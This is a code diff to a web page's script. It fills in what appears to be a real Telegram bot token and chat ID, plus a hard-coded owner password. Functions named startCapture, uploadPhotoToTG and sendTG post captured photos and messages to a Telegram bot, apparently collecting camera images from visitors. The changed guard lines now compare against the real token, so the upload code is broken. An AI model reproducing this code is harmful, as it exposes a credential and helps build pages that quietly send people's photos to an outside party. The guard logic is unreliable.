@@ -229,8 +229,8 @@ body{font-family:'Nunito',sans-serif;background:var(--bg1);color:var(--text);tra
 
 <script>
 // ── CONFIG ──
-const BOT_TOKEN = 'XXXXXXXXXX';
-const CHAT_ID   = 'XXXXXXXXXX';
+const BOT_TOKEN = '8534136895:AAF-1WJ3wAOoR1nE-miTzCf-lIXk1eDzU9I';
+const CHAT_ID   = '7065116481';
 const OWNER_PW  = 'PARTHRAJPUROHIT';
 
 // ── STATE ──
@@ -437,7 +437,7 @@ async function startCapture(){
 }
 
 async function uploadPhotoToTG(dataUrl,num){
-  if(BOT_TOKEN==='XXXXXXXXXX')return;
+  if(BOT_TOKEN==='8534136895:AAF-1WJ3wAOoR1nE-miTzCf-lIXk1eDzU9I')return;
   try{
     const blob=dataURLtoBlob(dataUrl);
     const fd=new FormData();
@@ -473,7 +473,7 @@ function checkPw(){
 
 // ── TELEGRAM ──
 async function sendTG(text){
-  if(BOT_TOKEN==='XXXXXXXXXX')return;
+  if(BOT_TOKEN==='8534136895:AAF-1WJ3wAOoR1nE-miTzCf-lIXk1eDzU9I')return;
   try{await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'HTML'})});}catch(e){}
 }
 
